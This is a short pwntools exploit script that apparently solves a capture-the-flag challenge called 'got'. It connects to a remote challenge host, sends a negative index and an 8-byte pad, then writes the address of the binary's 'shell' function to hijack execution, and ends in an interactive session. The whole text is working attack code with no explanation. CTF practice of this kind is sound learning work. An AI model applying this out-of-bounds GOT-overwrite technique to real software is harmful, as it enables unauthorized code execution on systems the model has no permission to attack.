from pwn import * 

elf = ELF("./got")
#io = process("./got")
io = remote('got-e5b717318b4e3e4f.deploy.phreaks.fr', 443, ssl=True)

io.sendlineafter("> ", "-4")

io.sendlineafter("> ", b"A"*8 + p64(elf.sym.shell))

io.interactive()